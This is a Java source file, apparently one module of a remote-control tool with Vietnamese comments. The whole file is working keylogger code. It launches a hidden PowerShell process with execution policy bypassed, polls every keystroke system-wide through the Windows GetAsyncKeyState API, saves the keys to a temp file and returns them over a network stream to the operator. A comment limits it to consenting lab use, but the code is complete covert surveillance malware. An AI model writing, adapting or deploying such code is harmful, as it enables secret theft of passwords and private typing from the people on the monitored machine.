import java.io.*;
import java.nio.file.*;

/**
 * Function 4: Keyboard Monitor
 * Cai dat bang PowerShell + Windows API GetAsyncKeyState.
 * Khong can thu vien ngoai, chay tren Windows.
 *
 * LUU Y BAO MAT: Chi dung trong moi truong hoc tap / lab co
 * su dong y cua nguoi bi giam sat. Ghi phim khong phep vi pham phap luat.
 */
public class KeyboardMonitor {

    private static volatile Process  keylogProcess = null;
    private static volatile File     logFile       = null;
    private static final Object      LOCK          = new Object();

    // PowerShell script su dung GetAsyncKeyState de bat phim toan he thong.
    // GetAsyncKeyState tra ve short; bit 0 (LSB) = 1 neu phim nhan TU LAN CUOI GOI.
    private static final String PS_SCRIPT =
        "Add-Type -TypeDefinition @\"\n" +
        "using System; using System.Runtime.InteropServices;\n" +
        "public class KH {\n" +
        "    [DllImport(\"user32.dll\")]\n" +
        "    public static extern short GetAsyncKeyState(int v);\n" +
        "}\n" +
        "\"@ -Language CSharp\n" +
        "$f = $env:TEMP + '\\kl_remote.txt'\n" +
        "if (Test-Path $f) { Remove-Item $f }\n" +
        "$map = @{\n" +
        "  8='[BS]';9='[TAB]';13='[ENTER]';27='[ESC]';32=' ';\n" +
        "  48='0';49='1';50='2';51='3';52='4';53='5';54='6';55='7';56='8';57='9';\n" +
        "  65='a';66='b';67='c';68='d';69='e';70='f';71='g';72='h';73='i';74='j';\n" +
        "  75='k';76='l';77='m';78='n';79='o';80='p';81='q';82='r';83='s';84='t';\n" +
        "  85='u';86='v';87='w';88='x';89='y';90='z';\n" +
        "  186=';';187='=';188=',';189='-';190='.';191='/';219='[';221=']';\n" +
        "  222=\"'\"}\n" +
        "while($true) {\n" +
        "  foreach($k in $map.Keys) {\n" +
        "    $s = [KH]::GetAsyncKeyState($k)\n" +
        "    if(($s -band 1) -eq 1) {\n" +
        "      $sh = ([KH]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0\n" +
        "      $c  = $map[$k]\n" +
        "      if($sh -and $c -match '^[a-z]$') { $c = $c.ToUpper() }\n" +
        "      Add-Content -Path $f -Value $c -NoNewline -Encoding UTF8\n" +
        "    }\n" +
        "  }\n" +
        "  Start-Sleep -Milliseconds 15\n" +
        "}\n";

    // ─────────────────────────────────────────────────────────────────────────
    public static void startKeylog(DataOutputStream out) throws IOException {
        synchronized (LOCK) {
            if (keylogProcess != null && keylogProcess.isAlive()) {
                send(out, "OK", "[KEYLOGGER] Dang chay roi. Goi 'Lay du lieu' de xem phim da nhan.");
                return;
            }
            try {
                // Ghi PowerShell script ra file tam thoi
                File scriptFile = File.createTempFile("kl_", ".ps1");
                scriptFile.deleteOnExit();
                try (PrintWriter pw = new PrintWriter(scriptFile, "UTF-8")) {
                    pw.print(PS_SCRIPT);
                }

                logFile = new File(System.getProperty("java.io.tmpdir"), "kl_remote.txt");

                // Chay PowerShell an (WindowStyle Hidden - khong hien cua so)
                ProcessBuilder pb = new ProcessBuilder(
                    "powershell.exe",
                    "-NonInteractive",
                    "-WindowStyle", "Hidden",
                    "-ExecutionPolicy", "Bypass",
                    "-File", scriptFile.getAbsolutePath()
                );
                pb.redirectErrorStream(true);
                keylogProcess = pb.start();

                send(out, "OK",
                    "[KEYLOGGER] Da bat dau ghi phim he thong.\n" +
                    "- Nhan 'Lay du lieu' de xem cac phim da nhan.\n" +
                    "- Nhan 'Dung ghi' de ket thuc va xem ket qua cuoi.");
            } catch (Exception e) {
                send(out, "ERROR", "Khong the khoi dong keylogger: " + e.getMessage());
            }
        }
    }

    public static void getKeylogData(DataOutputStream out) throws IOException {
        synchronized (LOCK) {
            try {
                if (logFile == null || !logFile.exists()) {
                    send(out, "OK", "(Chua co du lieu - hay bat keylogger truoc)");
                    return;
                }
                byte[] bytes = Files.readAllBytes(logFile.toPath());
                String data  = new String(bytes, "UTF-8");
                send(out, "OK", data.isEmpty() ? "(Chua co phim nao duoc nhan)" : data);
            } catch (Exception e) {
                send(out, "ERROR", "Loi khi doc log: " + e.getMessage());
            }
        }
    }

    public static void stopKeylog(DataOutputStream out) throws IOException {
        synchronized (LOCK) {
            try {
                if (keylogProcess != null) {
                    keylogProcess.destroyForcibly();
                    keylogProcess = null;
                }
                String last = "";
                if (logFile != null && logFile.exists()) {
                    byte[] bytes = Files.readAllBytes(logFile.toPath());
                    last = new String(bytes, "UTF-8");
                    logFile.delete();
                    logFile = null;
                }
                send(out, "OK",
                    "[KEYLOGGER] Da dung.\n" +
                    (last.isEmpty() ? "(Khong co du lieu)" : "Cac phim da nhan:\n" + last));
            } catch (Exception e) {
                send(out, "ERROR", "Loi khi dung keylogger: " + e.getMessage());
            }
        }
    }

    private static void send(DataOutputStream out, String status, String data) throws IOException {
        if (data != null && data.length() > 20000)
            data = data.substring(0, 20000) + "\n...[cat bot]";
        out.writeUTF(JsonUtil.textResponse(status, data));
        out.flush();
    }
}
